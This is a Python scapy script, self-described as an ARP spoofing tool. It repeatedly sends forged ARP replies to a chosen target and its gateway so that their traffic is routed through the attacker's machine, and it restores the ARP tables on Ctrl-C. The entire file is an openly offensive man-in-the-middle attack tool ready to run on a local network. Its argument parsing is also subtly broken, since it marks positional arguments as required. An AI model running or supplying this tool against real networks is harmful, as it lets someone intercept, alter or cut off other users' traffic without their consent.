from scapy.all import *
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp, send
import getmac
import argparse


def spoof(native_mac, target_mac, gateway_mac):
    # Specify the ARP source MAC address to prevent using the wrong interface MAC address
    sendp(Ether(src=native_mac, dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=native_mac, pdst=target_ip, hwdst=target_mac), iface=interface)
    sendp(Ether(src=native_mac, dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=native_mac, pdst=gateway_ip, hwdst=gateway_mac), iface=interface)


# Restore when arpspoof is done
def restore(target_mac, gateway_mac):
    restore_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac)
    send(restore_target)
    send(restore_gateway)

def run():
    if os.geteuid() != 0:
        print("Root required for operation")
        sys.exit(1)
    # Get the native MAC by specified interface
    native_mac = getmac.get_mac_address(interface)
    if not native_mac:
        print("The specified interface does not exist")
        sys.exit()
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print("The specified target does not exist")
        sys.exit()
    gateway_mac = getmacbyip(gateway_ip)
    if not gateway_mac:
        print("The specified gateway does not exist")
        sys.exit()
    while 1:
        try:
            spoof(native_mac, target_mac, gateway_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restore(target_mac, gateway_mac)
            break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP spoofing script, specify the target ip, gateway ip and interface')
    parser.add_argument("target_ip", help="target ip address", required=True, type=str)
    parser.add_argument("gateway_ip", help="gateway ip address", required=True, type=str)
    parser.add_argument("interface", help="specified he interface on your device", required=True, type=str)
    args = parser.parse_args()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    interface = args.interface
    run()
